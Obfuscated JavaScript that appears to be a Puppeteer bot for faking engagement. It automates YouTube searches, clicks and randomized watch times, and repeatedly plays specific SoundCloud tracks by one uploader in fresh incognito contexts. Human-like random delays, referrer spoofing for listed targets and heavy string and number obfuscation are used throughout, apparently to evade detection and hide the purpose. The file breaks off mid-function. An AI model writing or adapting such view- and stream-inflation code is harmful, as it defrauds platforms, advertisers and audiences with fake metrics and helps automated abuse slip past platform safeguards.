const Y = c,
  W = b,
  V = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x2149 * -0x1 + 0x1619 + -0x3761 * 0x1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x75a + -0x25 * -0x8b + 0x119 * -0x19), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x206 * 0x6 + -0x3 * 0x4c37 + -0x165f9 * -0x1 + (0xf * -0xda + 0x6153 + -0x531 * 0x5) * random()) : await standardWaitForNetIdle(f), await wait(-0xed5 + -0x50c * 0x7 + 0x45b1 + (0x1a95 * -0x1 + -0x13b7 + 0x4be * 0x12) * random()), -0x1dd1 + 0x10e0 + -0x2 * -0x679;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x7 * -0x26c + -0x53e + -0x4d * -0x1a), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x997 + 0x2e7 * -0xd + 0x1c25;
}

function a() {
  const bm = [
    'ramming/le',
    'u2vqlu9AqwLqyG',
    'oCoNWOKCecqIWP/cO8k9',
    'BNL2mIXTCMjLyq',
    's2L0lZuZnY4ZnG',
    'clear',
    'WRuPWQdcJZBdOCoDW6j/oW',
    'W699WPpcLIJdQG',
    'WRNdNCoTc8oCW6bTa8ktWRe',
    'y2f0y2G',
    'W73cQSkDWR1FW5FcQSkZoSoG',
    'BgfZDej5DgvjBG',
    'guO1nCkkWP84A8omrW',
    'rg/en/scri',
    'Bsb2AwrLBY4UlG',
    ',bts\x20eatin',
    'YlDpg8aCs5',
    'W79LWO7cJcm',
    'CSoxW7pdJSo9WP7cHCkDWQu2',
    'Ata4Cu5TC3nyzq',
    'ExrKlxzPzgvVlq',
    'zc1IzxrHlxrVBW',
    'https://ww',
    'mJGGtw9IAwXLia',
    'ESkbWO7dV8k/E3hdNZX2',
    'W5f1k3pdLSogeCo9W5hdOq',
    'W6pcR2iPWOyimmoBW5bd',
    'qwdwqdwqdw'
  ];
  a = function() {
    return bm;
  };
  return a();
}
async function randomWait() {
  return await wait(-0x133d + 0x1f3d + 0x2 * 0x3c4 + (-0x8eb + 0xaff * 0x1 + 0x1174) * random()), 0x132 + -0x1446 + -0x1315 * -0x1;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1 * -0x57a + -0xa2c + 0x4b2);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x16e2 + 0xd9 * -0x1a + -0xd8, 0x364 + -0x14 * -0x55 + -0xa01), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x1a54c + 0x1 * -0x18c19 + 0x1 * 0xd12d) * getRandomInt(-0x1e14 + 0x1 * -0x3f + 0x1e55, 0x1e93 + -0x4ff * 0x1 + -0x198f), h)), 0x2663 + 0x2281 + -0x48e3;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x531 + -0x2199 * 0x1 + 0x1c68;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x19 * -0x6d + 0x7b0 + 0x17b * 0x2]['split']('\x20');
    for (let k = -0x3a * 0x98 + -0x21d * -0x4 + -0x2 * -0xcfe; k < i['length']; k += 0x24f1 + -0xbc0 + -0x15 * 0x133)
      j += i[k] * h[i[k + (0x17bd + 0xa3d + -0x21f9)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x797 * 0x5 + -0x28 * -0x97 + -0x3d85)['map'](l => Array['from'](l['children']))['flat'](-0x1e * 0x99 + 0x2672 * 0x1 + -0x1483)['map'](l => l['childNodes'][-0x1cf3 * 0x1 + 0x11 * 0x161 + -0x53 * -0x11]['childNodes'][0x1 * 0x11f2 + 0x2258 + -0x344a]['childNodes'][0x15cb + -0x246c + 0xea2]['childNodes'][0x1de8 + -0x264d + -0x865 * -0x1]['childNodes'][0x1fd * -0x1 + 0xa * -0x82 + 0x2 * 0x389]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x13 * 0x20a + 0x1 * -0x43f + -0x29 * 0xbf, 0x1099 * -0x1 + 0x4d + 0x23d4)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x5 * 0x14e3 + 0x19c7 * -0x1 + 0xbcce);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1047d + 0xe7c2 + 0x1071b) * getRandomInt(-0x38a + 0x3 * 0x739 + -0x1 * 0x121f, 0x12f2 + -0x5 * 0x755 + 0x11bc), h);
  return await wait(i), 0x1 * 0x9aa + 0x1d3 * -0x8 + 0x4ef;
}
async function frontScreenActions(f) {
  const R = c;
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + R(0xe)), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x3 * 0xb6f + 0x8b1 * 0x2 + 0x83 * -0x65]['children'][0x1f11 * -0x1 + 0xb2d + 0x13 * 0x10c]['children'][-0x56b * 0x2 + 0x26db + -0x1c05]['children'][0xa7f * 0x1 + -0x23a4 + 0x1925]['children'][0x7f8 + 0x1f80 + 0x1 * -0x2778]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x22 * 0xa1 + 0xc3c + -0x1 * 0x219d;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1392 + 0x1ba + -0x14e8 + (-0x3 * -0x859 + -0x1dbd + 0x4e4) * random()
  }), await wait(-0x24ec * 0x1 + 0x6 * -0x4dc + 0x26e * 0x1c + (-0x1925 + 0x89e + 0x17 * 0xc5) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    const S = c;
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName'](S(0x14) + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x2413 + -0x1e1f + 0x4234]['childNodes'][0x1 * -0xf1f + 0x2bd + 0xc63]['childNodes'][-0x44c + 0x20ef + 0x5ba * -0x5]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0xc8b + -0xef + 0xd7f]['childNodes'][-0x93a * 0x3 + 0x214f * 0x1 + -0x83 * 0xb]['childNodes'][0xb7a + 0x183e + -0x23b6]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x4 * -0x319 + 0x1de6 + 0x1 * -0x1181),
          r = -0x547 * 0x1 + 0x23 * -0x42 + 0x7 * 0x20b;
        for (let u = -0x1 * -0x78e + 0x2314 + -0x66 * 0x6b; u < q['length']; u += -0x8 * -0x42d + 0xfa3 + -0x3109)
          r += q[u] * k[q[u + (0x1d71 + 0x1 * 0x1f7b + -0x3ceb)]];
        return r;
      }(n);
  });
  await wait((0x37b * -0x1 + 0x1 * 0x7255 + 0x1a21 * -0x2) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x67d3 + -0x15e0e + 0x37 * 0x8bd) * getRandomInt(-0x12 * -0x18e + 0x4 * -0x89e + 0x67d, -0x6f * -0x22 + -0x1c35 + 0xd81 * 0x1), h + (0x217 * -0xe + -0x356 * -0x1 + 0x2d74));
  return await wait(i), 0x20bc + -0x127c + -0xe3f;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x121 + 0x53 * -0x45 + -0x153e * -0x1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x7cd * 0x4 + -0x593 * 0x7 + 0x51f1 + (-0x1 * 0xcca + -0x867 * 0x3 + 0x277 * 0x11) * Math['random']());
    });
  }, -0x471 * -0x8 + 0x1d05 + -0x2535);
  await wait(-0xa4cb * 0x2 + -0x8e39f + -0x1 * -0xec115);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x23 * -0x4c7 + -0x4d5f * -0x6 + 0xcb * -0x4f) * getRandomInt(0x16f1 + 0x25ec + -0x3cd9, 0x2 * 0xc05 + 0x13b + -0x192c)), clearInterval(h), 0x429 * 0x8 + -0x8d1 * 0x4 + 0x1fd;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x3f8 * -0x2 + 0xb33 * 0x1 + 0x1 * -0x343;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xe3 * 0x13 + 0x250d + -0x1 * 0x1433;
    await randomWait();
  }
  return -0xa0d + -0x1a1 * 0xd + 0x63f * 0x5;
}

function fetchRandomSC() {
  return Math['random']() <= -0x7e + -0x1 * -0x3b7 + 0x339 * -0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x213 * -0x1 + 0xde * -0x10 + 0xff3 * 0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1 * -0x57a + -0xa2c + 0x4b2);
    let h = e[f];
    if (c['fmeXtk'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xd75 + -0x1511 + 0x2286, r, s, t = 0x1 * 0x25ff + 0x12 * 0x51 + -0x2bb1; s = m['charAt'](t++); ~s && (r = q % (-0x2149 * -0x1 + 0x1619 + -0x1baf * 0x2) ? r * (0x75a + -0x25 * -0x8b + 0x1b31 * -0x1) + s : s, q++ % (-0x103 * 0x2 + -0x4 * 0x987 + -0x2826 * -0x1)) ? o += String['fromCharCode'](0xa * -0x6d + 0x2071 + -0x1b3 * 0x10 & r >> (-(-0xed5 + -0x50c * 0x7 + 0x322b) * q & 0xd4b * -0x1 + -0x9dc + 0x15d * 0x11)) : -0x1dd1 + 0x10e0 + -0x1 * -0xcf1) {
          s = n['indexOf'](s);
        }
        for (let u = -0x7 * -0x26c + -0x53e + -0x5db * 0x2, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x997 + 0x2e7 * -0xd + 0x1c34))['slice'](-(-0x133d + 0x1f3d + 0x2 * -0x5ff));
        }
        return decodeURIComponent(p);
      };
      c['tECFQK'] = i, b = arguments, c['fmeXtk'] = !![];
    }
    const j = e[-0x8eb + 0xaff * 0x1 + -0x214],
      k = f + j,
      l = b[k];
    return !l ? (h = c['tECFQK'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x9 * 0xb1 + -0x3d * -0x29 + -0x38c + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0xb1d * 0x1 + 0x2 * -0x861 + 0x5a5;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x86e * 0x1 + -0x6cd * 0x9 + 0xf56b + getRandomInt(0x891 + -0x1a * 0x466 + 0xa463, 0x4f * -0xb + 0x3449 * -0x3 + -0x8 * -0x22ae));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x146b + 0xcb * 0x1b + -0xfd * 0x1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x91e * -0x1 + 0x1d79 + -0x2697;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xe8d + -0x1 * 0xddc + 0x1c69, 0x15e5 + -0x1 * 0x827 + 0x4 * -0x363)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x2222 + -0xec6 + 0x18 * 0x25d + floor((0x2 * -0x3e6 + -0x1 * -0x222d + -0x1679) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x6deea16 * 0x1f + -0xfe4d852e + 0xa94f2c84),
          0x2 * -0x6ad2db + -0x6 * 0xe17cf + 0x1aa3490,
          0x5 * 0x2adf + 0x2 * 0x6219 + 0xab * -0x1a7,
          -0x70 * 0x3c + -0x10b5 + 0x2b75
        ], y = [
          -0x8d5 * -0x3 + 0x1f7 * -0x5 + -0x1094,
          0x6ef + -0x18f2 + -0x1213 * -0x1,
          0x2403 * -0x1 + -0x8cf + 0x2cda,
          -0x8f1 * -0x2 + 0x733 + 0x1915 * -0x1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x5e1 + -0x1 * 0x1a61 + 0x2043)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0xf * -0x259 + -0xe6f + 0x31a6; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const T = b;
              if (T(0x7, 'D7uu') == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0xe3c + -0x2189 * 0x1 + 0x7 * 0x6d3) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x5 * 0x209 + -0xd7 + 0xef * -0xa] = A[0x2606 + 0xadb + -0x30d1] = A[-0x950 + -0x44 * 0x3a + 0x18b9] = A[0x3d0 + 0x23fb + -0x27c9] = A[-0x5ea + 0x33 * 0x7 + -0x2 * -0x244] = A[-0x1dd8 + -0x6 * 0x187 + 0x3 * 0xd02] = A[0x139d + 0x15b5 * -0x1 + -0x21d * -0x1] = A[0x593 * 0x7 + -0x3 * -0x5ad + -0x3806] = A[-0x1aa1 + -0x1320 + 0x2dc8] = A[0x2561 + 0x1f2b * 0x1 + -0xa * 0x6da] = A[0x18a4 + -0xc6 * 0x2b + 0x8a7 * 0x1] = A[-0x1d39 * -0x1 + 0x99e + -0x26cd] = A[-0x1 * 0x1cf7 + -0x78b * 0x3 + 0x1 * 0x33a3] = A[0x2076 + 0x1f * -0xb3 + 0xabd * -0x1] = A[-0x226f + 0xfb * 0x1f + -0x1 * -0x417] = A[-0x2 * 0x296 + 0x1b52 + 0xe * -0x194] = A[-0x1 * -0x1b67 + 0x148 * 0x4 + -0x2078] = 0x1499 * 0x1 + 0x902 + -0x1d9b, this['blocks'] = A) : this['blocks'] = [
                0x1b7 * -0x9 + -0xa2f + -0x6 * -0x445,
                0x144c + -0x1 * 0x6c5 + 0xd87 * -0x1,
                0x1059 + -0x32d * -0x1 + -0x3 * 0x682,
                -0x44 * -0x2d + -0x1860 + -0xd4 * -0xf,
                -0x24b * 0xd + 0x1 * -0xc6c + -0x13 * -0x239,
                0x1 * 0x1ead + 0x5 * 0x17 + -0x1f20,
                0xa * 0x382 + -0x2569 + -0x3 * -0xc7,
                0x98c + -0x16ad + 0xd21,
                0x1 * 0x2169 + -0xacb + 0xb4f * -0x2,
                -0x26fd + 0x136c + -0x1 * -0x1391,
                -0x1593 + -0x3 * -0xd5 + -0xde * -0x16,
                -0xc0e + -0xfae + 0x1bbc,
                -0x1c14 + -0x4f8 * -0x5 + 0x5c * 0x9,
                -0x15db + 0x2 * -0xac4 + 0x1d * 0x17f,
                -0x1456 + 0x523 * -0x1 + 0x1979,
                0x3d * -0x55 + 0xab0 + 0x991,
                0x828 + -0xb3c + 0x314
              ], this['h0'] = -0x7c9 * 0x107064 + -0x23f4a1 * 0x145 + 0x114e5adea, this['h1'] = -0x11f40670 + -0x7 * 0x2a95979d + 0x1375f24 * 0x1c9, this['h2'] = 0x4b2e511 * -0x37 + 0x952619aa + 0x10603f9fb, this['h3'] = -0x8809d78 * 0x1 + 0x11d25c6b + 0x1365 * 0x5ac7, this['h4'] = 0x1705a * 0x535e + -0x305da45 + -0x4ee44d29 * -0x1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x11c * -0x23 + 0xe70 + 0x79c * -0x7, this['finalized'] = this['hashed'] = 0xe9 * -0x8 + -0x2616 * 0x1 + 0x2d5e, this['first'] = -0x10d9 + 0x1220 + -0x2 * 0xa3;
            }
            ['update'](J) {
              const U = c;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x21 * -0xc5 + -0x8cc + 0x1 * -0x1099, O = J['length'] || -0x1846 * -0x1 + -0x352 + -0x14f4, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0xc78 * -0x2 + -0x139c + 0x4 * 0xb23, P[-0x15c6 + 0xaa2 * 0x1 + 0xb24] = this['block'], P[-0x3a * 0x7 + 0xab5 * 0x3 + -0x1e79] = P[-0xaba * -0x1 + 0x29 * 0x15 + 0xe16 * -0x1] = P[-0x1 * -0x10d2 + -0x1218 + 0x29 * 0x8] = P[0x1 * -0x1709 + -0x1 * 0xc95 + 0x517 * 0x7] = P[-0x2052 + 0x2 * 0xde7 + 0x488] = P[0x1da * 0x10 + -0x2 * -0xbf + -0x1f19] = P[0x2518 + -0x2466 + -0xac] = P[-0x24f8 + -0x1625 + 0xec9 * 0x4] = P[-0x29 * -0x5d + -0x1b95 + 0xb * 0x128] = P[-0x220b + -0x6f2 * 0x1 + -0xb2 * -0x3b] = P[0x8 * -0x30b + 0x1c0b * 0x1 + -0x3a9] = P[0xdfd + 0x6a * -0x34 + 0x796] = P[0x1453 + 0xaba + -0x1f01] = P[-0x2d6 + 0x1 * -0x160c + -0x18ef * -0x1] = P[-0x2 * 0xf4a + -0x138c + 0x322e] = P[-0x3e * -0x1d + -0xf23 + 0x20b * 0x4] = -0x4 * -0x946 + 0x364 + 0x2 * -0x143e), K) {
                    for (N = this['start']; M < O && N < -0x144b + 0x84 + 0x6ad * 0x3; ++M)
                      P[N >> -0x3 * 0x291 + 0x29 * -0x3 + -0x10 * -0x83] |= J[M] << y[0x1393 + -0x1d24 + 0x994 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1da6 + 0x2109 + -0x3e6f; ++M)
                      (L = J['charCodeAt'](M)) < 0xe5a + 0x812 * -0x3 + 0x1a * 0x66 ? P[N >> 0xc2 * 0x1 + -0x9 * -0x391 + -0x20d9] |= L << y[0xa * 0x2e2 + 0x9a1 * 0x2 + 0x3013 * -0x1 & N++] : L < -0x201d * 0x1 + -0xd24 + 0x1 * 0x3541 ? (P[N >> 0xc70 + 0x1b8f + -0x27fd] |= (-0x497 + -0x1 * -0x1666 + 0xb * -0x18d | L >> -0x14ae + 0x1003 + -0x4b1 * -0x1) << y[0x2638 + -0x7 * -0x12a + -0x2e5b & N++], P[N >> 0x7f4 + 0xab1 + -0x12a3 * 0x1] |= (-0xb2e + 0x35 * -0xd + 0xe5f | 0x217 + 0xb3c * -0x3 + 0x4 * 0x7f7 & L) << y[0x5f9 * 0x2 + -0x1e6b + 0x127c & N++]) : L < -0x4d46 + -0x2b * 0x44f + 0x1de8b || L >= -0x9944 + 0x72e0 + -0x2 * -0x8332 ? (P[N >> -0x14f * -0xb + -0x252b + 0x3 * 0x798] |= (0x1 * 0x36d + 0x446 * -0x3 + 0xa45 | L >> 0x1d * -0x4d + -0x1ba * 0x14 + 0x2b4d) << y[-0x13d8 + 0x222c + -0xe51 & N++], P[N >> -0x142d + 0x15da + -0x3d * 0x7] |= (0x29 * -0x31 + -0x39 * 0x5b + 0x1c9c | L >> 0x16a9 + 0x852 + -0x1ef5 & 0x255 * -0x10 + 0x3d1 * -0x4 + 0x1 * 0x34d3) << y[0x1158 + -0x886 + 0x8cf * -0x1 & N++], P[N >> -0x81d + 0x2678 * 0x1 + -0x1e59] |= (0x2596 + 0x172 * 0xd + -0x10 * 0x37e | 0xc95 + -0x73 * 0x55 + -0x1 * -0x19d9 & L) << y[0x19e7 + -0x999 + -0x104b & N++]) : (L = 0x2b09 * -0x7 + -0x6 * -0x1b4c + 0x18977 + ((-0x2db * 0x6 + -0x1594 + 0x349 * 0xd & L) << 0x1c * -0x26 + 0x5ec * -0x6 + 0x27ba | -0x1315 + -0xa34 + 0x2148 & J['charCodeAt'](++M)), P[N >> -0x189f + 0x2294 + 0x351 * -0x3] |= (0xaad + -0x15b2 + -0x1 * -0xbf5 | L >> -0x1e + 0x9dc * -0x2 + 0x13e8) << y[0x15a4 + 0x1272 + 0x2813 * -0x1 & N++], P[N >> 0x2629 * 0x1 + 0x3 * -0x2d3 + -0x1dae] |= (-0x49 * 0x61 + -0x5 * 0x44f + 0x31b4 * 0x1 | L >> 0x8c * 0x44 + -0x8a * 0x26 + -0x8 * 0x215 & 0x56c + -0xde2 + -0x8b5 * -0x1) << y[-0x8f * -0x14 + 0x193b + -0x1232 * 0x2 & N++], P[N >> -0x83c + 0xd * 0x17b + -0xb01] |= (-0x504 + -0x2473 + 0x29f7 | L >> 0x9b * 0x35 + 0x2 * -0x12d6 + -0x5 * -0x11f & 0x169f + 0x57b + -0x1bdb * 0x1) << y[0x24e * 0x4 + -0x133d * -0x2 + -0x2faf & N++], P[N >> -0x1eda + 0x2e * -0x6f + -0x7 * -0x742] |= (-0x234a * 0x1 + -0x1 * 0x16d3 + 0xbb9 * 0x5 | -0x3 * 0x5c7 + -0x1ef4 + 0x3088 & L) << y[-0x2686 + 0x2133 + 0x556 & N++]);
                  }
                  this[U(0xb) + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x61 * 0x8 + 0x3 * -0xbc9 + -0x1f * -0x10d ? (this['block'] = P[0x63 * 0x4 + 0xe0 + -0x25c], this['start'] = N - (-0xc2 * -0x33 + 0x915 + 0xd * -0x3a7), this['hash'](), this['hashed'] = 0x1514 + 0xbe7 + 0xe * -0x25b) : this['start'] = N;
                }
                return this['bytes'] > -0x12e84be3 * 0x11 + -0x153bb95ab + 0x395289fbd && (this['hBytes'] += this['bytes'] / (0x28 * 0x5372fdb + 0x27326d92 * -0x4 + -0xe1b8 * -0xe78e) << 0xa * 0x199 + 0x828 + -0x1 * 0x1822, this['bytes'] = this['bytes'] % (0x1cb69e96 * 0x8 + -0x812fac + -0x177be * -0x1242)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x22 * -0xf7 + -0x1178 + 0x1 * -0xf55;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
